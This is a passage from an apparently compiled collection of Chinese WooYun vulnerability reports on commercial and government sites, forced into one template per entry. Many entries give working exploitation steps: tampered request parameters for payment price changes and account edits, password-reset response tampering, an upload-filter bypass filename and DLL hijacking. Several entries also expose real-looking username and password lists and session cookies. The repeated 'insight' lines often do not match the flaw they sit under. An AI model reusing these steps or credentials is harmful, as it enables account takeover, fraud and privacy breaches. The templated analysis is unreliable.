1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 最新版。在url上输入：https://example.com/[已脱敏]

**POC**: 成功执行代码

**绕过**: 直接利用

**修复**: 参考：https://example.com/[已脱敏]
---

---
### [wooyun-2015-0123016] 电信某重要站点逻辑缺陷可批量修改用户信息
**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: www.ctmedia.net     媒体平台，就是买广告位的地方，几十万到几百的位置不等我们注册两个账户fuzz和fuzz1登陆fuzz1,信息如下图点击修改，然后在数据包id改完fuzz的cmd=accountManageProc&op=update&id=10001384&role=1020000000&name=%E6%9D%8E%E6%98%8E%E5%8D%9A&email=123%40123.com&mobile=13111112222登陆fuzz账户看一下。 改掉了。这可以跑脚本遍历所有改掉

**POC**: cmd=accountManageProc&op=update&id=10001384&role=1020000000&name=%E6%9D%8E%E6%98%8E%E5%8D%9A&email=123%40123.com&mobile=13111112222

**绕过**: 直接利用

**修复**: 修修修
---

---
### [wooyun-2011-03691] 中关村在线用户注册邮件验证绕过缺陷
**厂商**: 中关村在线 | **年份**: 2011 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中关村在线用户注册时，需要向注册用户邮箱发送含有加密字符串的激活链接进行激活，如https://example.com/[已脱敏] 但加密字符串在”重新发送邮件“功能处泄露，如图:导致可以猜到code处的 参数，直接拼接url https://example.com/[已脱敏] 进行激活。邮件验证形同虚设，导致恶意灌水注册。

**POC**: 注册新用户，邮箱随便填写，提交。点击查看 源代码，找”再次发送注册邮件链接“取出code参数，拼接链接(uid为注册名称)https://example.com/[已脱敏] 并访问，提示激活成功。

**绕过**: 直接利用

**修复**: 修改激活链接和 重新发送链接 以及 更换邮箱链接里的code参数一致的缺陷
---

---
### [wooyun-2015-0108290] 263通信某支付功能逻辑缺陷
**厂商**: 263通信 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一分钱充1千万，感觉摊上事了...263云通信，在线充值：https://example.com/[已脱敏]

**POC**: 很抱歉，测试的时候分别用1毛钱和1分钱充了两个100的订单。暂时没有消费，请撤回吧，拿着手抖~~

**绕过**: 直接利用

**修复**: 修改提交订单处逻辑，加强安全测试。
---

---
### [wooyun-2015-0103160] 云农场重置密码漏洞
**厂商**: 云农场 | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 云农场1 手机验证码在返回包中2 POST请求直接改密https://example.com/[已脱敏] /resetPassword.php?val=18700000000&type=0&act=checkPhone HTTP/1.1Host: www.ync365.com返回的是：no然后我输入自己的手机号187********，发送验证码，先有一个验证手机是否存在的数据包，这个返回的是：yes这个可以用来证明一个手机号是否存

**POC**: 改密成功，可以登录。

**绕过**: 直接利用

**修复**: 逻辑
---

---
### [wooyun-2013-046547] 乌云集市验证码机制绕过
**厂商**: 乌云官方 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 乌云的验证码机制是页面加载完成后，去请求captcha.php生成验证码，将验证码记录当再次请求或跟换验证码时，在访问一次captcha.php生成验证码，那么我们直访问一次captcha.php生成验证码后，不去访问captcha.php后，验证码永远为第一次产生的。嘎嘎说到底就是验证码和页面不是同步机制，而是异步交互，导致绕过

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 同步机制
---

---
### [wooyun-2015-0161881] 特变电工某系统设计逻辑缺陷导致内部信息泄露
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: TBEA即特变电工股份有限公司（简称：特变电工），是中国变压器行业首家上市公司（股票代码：600089），中国重大装备制造业的核心骨干企业，国家级企业技术中心和博士后科研工作站，拥有对外经济技术合作经营权和国家外援项目建设资质，是中国重大装备制造业首家获得“中国驰名商标”和“中国名牌产品”的企业集团。同时，也是中国重要的变压器、电线电缆、高压电子铝箔新材料、太阳能核心控制部件的研发、制造和出口企业。http://**.**.**.**/近百名个员工初始密码使用123456随便选择一个：libo+123456成功进入后台8400余条公司员工及高管资料大量内部消息

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 弱口令！弱口令！弱口令！
---

---
### [wooyun-2013-033957] 知道创宇旗下安全联盟（anquan.org）设计缺陷可以冒领站点
**厂商**: 知道创宇 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 安全联盟(anquan.org)是一个综合性的网址安全服务平台。站长可以通过加入安全联盟来获取站点是否存在漏洞和漏洞修复建议，如果可以冒领的话，那么我么就可以很轻松的入侵网站了！1.问题出在代码验证处2.生成一段验证代码3.插入网站4.回到安全联盟点击验证验证，验证的时候就是检查网站有没有这段代码啦，有的话就是成功即可查看网站安全和漏洞内容了5.问题就出来了。这边存在一个逻辑缺陷，验证的时候就是检查网站有没有这段代码啦，只要站点插入了安全联盟的代码，由于每个网站对应的认证代码是固定的，任何人只要通过代码验证就能通过验证，因为网站确实有这段安全联盟的代码啊，所以验证就通过了！然后取得权限来查看站点漏洞信息，如果存在漏洞那么可以凭借安全联盟给出的提示轻松可以入侵了。

**POC**: 问题就出来了。这边存在一个逻辑缺陷，验证的时候就是检查网站有没有这段代码啦，只要站点插入了安全联盟的代码，任何人只要通过代码验证就能通过验证，因为网站确实有这段安全联盟的代码啊，所以验证就通过了！

**绕过**: 直接利用

**修复**: 自己想办法
---

---
### [wooyun-2013-019761] 新东方逻辑支付漏洞
**厂商**: 新东方 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 随便找一个课程，立即报名，抓包，发现金额无法修改，他是直接和schoolid绑定的，不过还有一处我们可以利用，那就是配送方式，且配送方式的金额可以，不过有验证，课程+配送运费不能低于0，所以我们就让他成为正吧。修改运费为-，两者相加则为正数才可以，我们这个设置为1元吧

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 验证运费
---

---
### [wooyun-2014-065319] 新网主站登录设计逻辑缺陷可撞库分析
**厂商**: 新网华通信息技术有限公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 新网主站登录设计逻辑缺陷，去年解析域名的时候发现的问题。。。。https://example.com/[已脱敏]

**POC**: 8、分分钟就出现弱口令了....口令正确，页面返回当前用户名；9、估计弱口令的都是小号，有业务的账号，不可能用12345678，不过你也可以换字典再批量跑...

**绕过**: 直接利用

**修复**: 我就看看，我不说话；
---

---
### [wooyun-2015-0127495] 17zwd某功能逻辑缺陷导致任意重置用户账号密码
**厂商**: 一起做网店 | **年份**: 2015 | **类型**: 

**元思考**: 触发信号: 功能测试

**洞察**: 防护不足，开发者信任前端输入

**测试流程**:
1. 识别相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这是一个悲伤的故事

**POC**: 输入一个自己能接收短信的手机号，走一遍正常流程。收到短信验证码后修改他人手机号就可实现任意重置了

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2015-0147471] 山西卫视某功能设计逻辑缺陷存在大量弱口令
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/space.php?uid=1通过遍历UID可获取用户名且在http://**.**.**.**/do.php登陆页面未设有验证码共收集了1000个用户名 网站速度过慢 只取1000个来检验(也是因为这1000中有挺多主持人与电视台 电视节目的用户)

**POC**: 账号	密码山西影视频道	123456网络台评论员	123456黄河大交通	123456最美中国人	123456音乐风云榜	123456老梁故事会	123456欢乐大篷车	123456走进大戏台	123456专家来了	123456音乐广播	123456达人归来	123456非常某金融机构	123456农村广播	123456交通广播	123456经视直播	123456新闻观察	123456一拨就灵	123456真相解码	123456小郭跑腿	123456梁宏达	123456白咖啡	123456都市110	123456子夜	123456刘倩	123456雷璐	123456黄河新闻	123456黄河新闻	1

**绕过**: 直接利用

**修复**: 改
---

---
### [wooyun-2015-0149924] 中铁十八局办公系统设计逻辑缺陷泄露企业信息
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中铁十八局办公系统弱口令泄露企业信息

**POC**: 中铁十八局办公系统弱口令泄露企业信息，可查通讯录、重要通知等企业敏感信息地址：http://**.**.**.**/names.nsf?Login弱口令用户利用某账户成功登录通讯录查看公告通知人员任职公示

**绕过**: 直接利用

**修复**: 通知用户修改弱口令啊亲
---

---
### [wooyun-2016-0169512] 购酒网某处设计逻辑缺陷可重置用户密码
**厂商**: 购酒网 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 以土豪号为例：首先进入密码找回页面，选择用手机短信找回方式，并填入相应信息打开burpsuite拦截功能后点击下一步显示验证码已发送一直前进至输入验证码界面在验证码输入栏输入任意数，这里以222222为例点击下一步后前进至响应结果将响应结果success后“0”值改为“1”提交成功进入密码修改页面修改密码为wuyun123提交，显示修改密码成功用新的密码登录验证，可成功登录。

**POC**: 如上

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-053331] 中国图书网支付漏洞(没错只要0.01元，书籍打包全部带回家)
**厂商**: 中国图书网 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 选一本书一路下订单付款方式选择在线支付下订单成功点击 选择支付方式 某电商平台  burp截断get请求中 价格以明文形式 提交，这里 可以任意改价格额，可惜0.00不可以 只好浪费0.01元了价格变成0.01成功支付！！！

**POC**: (见原文)

**绕过**: 截断攻击

**修复**: 你们应该更懂吧 ！！！
---

---
### [wooyun-2012-09113] KTV点歌系统出错
**厂商**: 厂商不明 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 点歌系统设计缺陷，只要三点触屏就会被识别成右键点击。通过flash设置可以开启文件浏览功能，开启cmd。系统自带手写板功能和长触屏右键列表，就是打起字来特别麻烦。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不懂
---

---
### [wooyun-2015-0104053] 麦乐购某处逻辑漏洞(73w注册账号可遍历)
**厂商**: 麦乐购 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册处存在逻辑错误，可遍历所有注册用户的登录账号https://example.com/[已脱敏]

**POC**: 已经绑定邮箱的还可泄露邮箱信息利用危害，可以通过弱口令去登录其他账号，还得通过邮箱，手机号等登录信息去社工。。有一定的危害，这里说明问题，不深入测试

**绕过**: 直接利用

**修复**: 在URL中删除UserId等敏感参数
---

---
### [wooyun-2015-0162295] 最新版apache和iis网站安全狗上传绕过
**厂商**: 安全狗 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 之前看到可以这样绕过：bypass.phpX，X的hex为0x90现在这个绕过已经修复那现在只需要在php扩展名和X中间加个空格就可以绕过，即bypass.php X，X的hex为0x90等

**POC**: apache最新版本3.5上传一个文件名为bypass.php X，X的hex为0x90上传成功

**绕过**: 过滤绕过

**修复**: 过滤
---

---
### [wooyun-2013-038385] 某社交平台看游戏客户端DLL劫持漏洞
**厂商**: 某社交平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不存在的dll加载它干甚
---

---
### [wooyun-2016-0167549] 浙江某政府网站设计逻辑缺陷导致部分用户信息泄露
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: # 网址: http://**.**.**.**/登录时发现用户名密码都是明文的，然后也没发现验证码使用top500的姓名拼音+密码123456撞库发现以下账号是成功的zhanghongmei	123456chenguiying	123456wangshuying	123456wangguihua	123456liguiying	123456zhangjian	123456zhanghong	123456zhangjian	123456zhanglili	123456wangyong	123456zhangtao	123456zhangyun	123456liyuying	123456liushuai	123456wangyang	123456chenwei	123456wanglin	123456wangqin	123456wangyun	123456wanglin	123456liuq

**POC**: 以wangshuying/123456为例#一、查看个人信息#二、在线办理#三、咨询和投诉

**绕过**: 直接利用

**修复**: # 增强校验机制
---

---
### [wooyun-2012-04689] 移动短信轰炸
**厂商**: 某运营商 | **年份**: 2012 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]  老话长谈了，没啥好说的。

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 加个限制吧
---

---
### [wooyun-2014-051413] 某电商平台咚咚可构造特殊信息
**厂商**: 某电商平台商城 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在处理URL的时候，某电商平台咚咚的判断是 （我用正则体现）www\..*? 就为网址，然后进行url特殊处理，使之可以直接点击打开。然后我们就可以利用这一特性，再加上对待传输文件的特殊信息，构造。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-019542] 四川电信绕过密码校验查询用户的账单、通话详单、短信详单、上网详单及其他各种信息(非暴力破解)
**厂商**: 四川电信 | **年份**: 2013 | **类型**: 非授权访问/认证绕过

**元思考**: 触发信号: 认证接口

**洞察**: 非授权访问/认证绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别非授权访问/认证绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 利用利用工具进行手机号生成对应的用户ID18980000000======SC189Checker===============Encode=========7B2AE77D404FD32D62E2E786BA69E990==========DONE==========返回信息加过密，自己写了个利用工具进行解密。获取用户流量信息POST HTTP://wapsc.189.cn:8006/wapLogin/getFlow.actionPost值:accountid=用户ID &channelTypeId=001&cityCode=C0713CC421F4E2CF&cityName=%E5%9B%9B%E5%B7%9D+%E6%88%90%E9%83%BD&serviceId=2======SC189Checker===============Decode========={"overFlow

**POC**: 请复制详细说明内容~cncert或者wooyun官方需要我这个2B解码软件做复现请PM我。

**绕过**: 编码绕过

**修复**: 你再加密一次试试看啊~
---

---
### [wooyun-2013-044836] 安卓版微云客户端绕过独立密码
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 安装好微云，登录到验证独立密码界面：然后直接按HOME键返回启动器主页，注意不要关掉微云：然后在点击微云客户端进入，神奇的一幕出现了，没有提示验证独立密码了：

**POC**: 不信自己试试！

**绕过**: 直接利用

**修复**: 估计测试工程师又加班了，建议苦逼的程序员做好权限验证。实在不行干脆取消独立密码吧，反正绕过微云独立密码的方式挺多的！
---

---
### [wooyun-2013-032638] 土豆网新消息提醒的绑定邮箱CSRF漏洞+email验证链接逻辑漏洞
**厂商**: 土豆网 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 页面https://example.com/[已脱敏] https://example.com/[已脱敏] HTTP/1.1Accept: */*Referer: https://example.com/[已脱敏] zh-cnUser-Age

**POC**: 结合上述第2点和表单input，制造attack.html（email参数里写黑客控制的参数），放到wordpress上，或者黑客自己的网站（类似squarefree.com）然后将这样的地址放到某社交平台上传播，一旦土豆用户点击打开attack.html（登录状态下），就会有如下邮件发到黑客邮箱。然后，黑客在不登录土豆的状态下点击这个email，也会提醒你绑定邮箱成功（所以更严重的漏洞可能是这边），虽然会再跳到登录页面（https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 1. CSRF防御那边你们更清楚（比如限制refer只能是https://example.com/[已脱敏] 提醒邮箱绑定认证那边，需要在用户登录情况下才生效https://example.com/[已脱敏]
---

---
### [wooyun-2012-010561] 再爆苏宁某站点重大漏洞
**厂商**: 江苏某电商平台电子商务有限公司 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.存在漏洞的是主站哦https://example.com/[已脱敏]

**POC**: 3.填写好想要信息之后，进入到付款页面，注意看金额，这里是原价2866.00元4.下面是重点了，提交订单，在跳转到银行支付的页面时，抓包，将金额改成￥1.005.具体的参数信息如下，Amount肯定就是金额了BranchID=0025&CoNo=004624&BillNo=0023258647&Amount=2866.00&Date=20120804&MerchantUrl=https%3A%2F%2Fcallback.suning.com%2FNetPayment%2Fcallback%2FpageCallBack.action&MerchantPara=232586476.转到银行支付页面

**绕过**: 直接利用

**修复**: 厂商懂的，不过建议彻查下吧！
---

---
### [wooyun-2015-0150630] 黄河银行Android版手机客户端信任任意服务端证书漏洞
**厂商**: 黄河农村商业银行 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 客户端程序覆盖了谷歌默认的证书检查机制，但应用程序自己未对所连服务端证书做验证。手机不需安装代理服务器证书的情况下，中间人代理服务器可解密客户端与服务端通信的报文数据。

**POC**: 1.基本信息apk  : com.bank, 10, 2.0.1, 黄河银行apkmd5: 5cb9942f297c4cc4e12a6decde923c90证书 :certmd5: 84b3acd2483de19f0768477681294116issuer: C=CN, ST=宁夏回族自治区, L=银川, O=黄河农村商业银行, OU=黄河农村商业银行, CN=YRRCBsubject: C=CN, ST=宁夏回族自治区, L=银川, O=黄河农村商业银行, OU=黄河农村商业银行, CN=YRRCB下载地址：官网2.漏洞证明：通过客户端程序的反编译后的java代码分析可看出，客户端程序覆盖

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0168729] 某市卫生局官网设计逻辑缺陷一枚
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 主站地址：http://**.**.**.**/1、注册账号http://**.**.**.**/e/member/cp/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2016-0191283] 任意具有某服务权限的安卓应用都能轻松截获某电商平台支付密码
**厂商**: 某电商平台 | **年份**: 2016 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某电商平台的安全键盘上没有做好对于accessibility service一定的防护，任意的具有accessibility service权限，并在设置中的无障碍开启的应用比如某互联网公司抢红包插件都有可能成为窃取某电商平台支付密码的工具安卓软件有一个功能叫做无障碍，本来是用于给一些残障人士使用的，比如talkback应用给一些视力不好的人士使用，在开启后，当手指触碰到某个view的时候，系统会把这个view的内容读出来给你。春节的时候，流行各种的某互联网公司抢红包插件就是利用了这个aceessibility service来实现获取屏幕上的信息以及自动抢红包。虽然这个功能是用户自己开启的，而且开启的时候，提醒用户可嫩会读取信用卡信息。但是作为一个涉及到财产安全的app，还是要对这个功能做一层防护的。在这方面，某互联网公司和掌上生活都做得很好，对于aceessibility service做了一定的防护。然而作为一个大

**POC**: 现在只是在logcat里面打印出来密码，完全可以做到收集到密码后上传到服务器。甚至是自己空视频地址：http://**.**.**.**/v_show/id_XMTUxOTA1NzM4OA==.html

**绕过**: 直接利用

**修复**: 可参考某互联网公司的防护措施，设立一个安全键盘，安全键盘的每一个键都设置一个自定义的accessibility delegate ,这样的话，支付密码就不会被任意有accessibility 权限的应用监听到
---

---
### [wooyun-2016-0175090] 习网-在线学习站点设计逻辑缺陷导致信息泄露
**厂商**: 习网 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台登陆 用123456作为密码进行暴力破解 成功爆破n个任意修改密码

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这个，后台加上验证码。怎么样？
---

---
### [wooyun-2013-033885] PPS影音DLL新型劫持漏洞
**厂商**: PPS网络电视 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: PPStream.exe存在严重dll劫持漏洞，可加载指定dll后执行任意代码。PPStream.exe启动时会加载一个不存在的名为tsr.dll，只要自己写一个tsr.dll与PPStream.exe放在同一目录，这样就可以在运行PPStream.exe的时候同时加载tsr.dll，tsr.dll可以为自制的任意恶意dll。同时发现PPSKernel.exe也会同时加载tsr.dll

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的！
---

---
### [wooyun-2015-0164860] 维思诺设计逻辑缺陷导致大量员工邮箱沦陷/项目通讯录泄露
**厂商**: 维思诺 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 进去需要重置密码    应测试需要重置了一个 ad@vsnoon.com邮箱mail.vsnoon.com官网www.vsnoon.com

**POC**: 进去需要重置密码    应测试需要重置了一个 ad@vsnoon.comad@vsnoon.com            Wooyun2015     （应测试需要重置为 Wooyun2015）hejian@vsnoon.com        vsnoon1234zhouzhigang@vsnoon.com   vsnoon1234huangxiaohua@vsnoon.com  vsnoon1234guoshaokai@vsnoon.com    vsnoon1234zhangwei@vsnoon.com      vsnoon12345liuchunxiao@vsnoon.com   vs

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2015-0148449] 某外卖平台某系统逻辑漏洞可导致用户敏感信息泄漏
**厂商**: 某外卖平台 | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出在有菜 某互联网公司端首先我们看下商户信息然后抓包GET /api/supplier/2792 HTTP/1.1Host: youcai.ele.meAccept-Encoding: gzip, deflateCookie: _utrace=c8456e60386614d292486c081b713c10_2015-10-13; eleme__ele_me=f5392406e563495e23b77fefe7e2d099%3A7deebd27579661558aa60ff03882f47a47b5733a; track_id=1444666918%7Ccd7c60baeac69b4cfd36667853b4efd0990137340c68e6f9f0%7C4621431fe41c60df1fb5c396d1ea5f7b; ubt_ssid=yz8zt80frn2fw1epek29ymoq3g

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修复
---

---
### [wooyun-2013-024117] 某门户网站支付漏洞可无限获得凤凰币
**厂商**: 某门户网站 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: vip参数可以修改，｛您当前VIP等级为 VIP0 ，拥有永久赠送凤凰币特权。本次充值您将共计获得： 10 凤凰币( 10 凤凰币 + VIP0赠送的凤凰币数量 即： 10 * 0% 凤凰币)返还金额不足1凤凰币不返还 ｝,gold这个参数应该是充值得到的凤凰币，上面一个参数是需要付款的金额。

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0123750] 融科贷P2P理财支付漏洞+任意登录两种方法
**厂商**: 融科贷 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1：支付漏洞在商城那里，可以1分钱买别人几百块的东西，也可以输入负数，导致自己账户的金额变多。。2：任意登录在面膜重设那里

**POC**: 1;支付漏洞，不多说了，看图 1-4张是0.01元购买商品的具体详情  第五张是昨晚输入-200块购买账户变多的2：密码重设任意登录两种方法（1） 找回密码验证码是4位纯数字的，直接爆破，已经测试过（2）修改服务器返回值，这个直接绕过验证码，都不用验证码了，具体下图1;找回密码，填自己的账户，手机，验证码----这个是正常找回的2：点击提交是，抓包，然后发送到服务器，得到服务器返回值----把服务器返回值复制起来3：重新回到找回密码页面，不过这回不同了，输入用户名，其它的随便乱填4：点击提交后，把错误的服务器返回值改成上面正确返回值，然后页面自动跳到重设密码页面啦5：填上账户等ok，提交显示重

**绕过**: 直接利用

**修复**: 你们懂的！今天去你们家面试，里面美女MM蛮多的，就是工资好低，基本活不了，还浪费我10块钱的地铁费呢，发份大礼补补我啊，哈哈。。。。。
---

---
### [wooyun-2014-062558] 某手机云服务验证码绕过可暴力破解，查看短消息、通讯录，远程拍照、发消息
**厂商**: 某手机厂商 | **年份**: 2014 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 认证接口

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

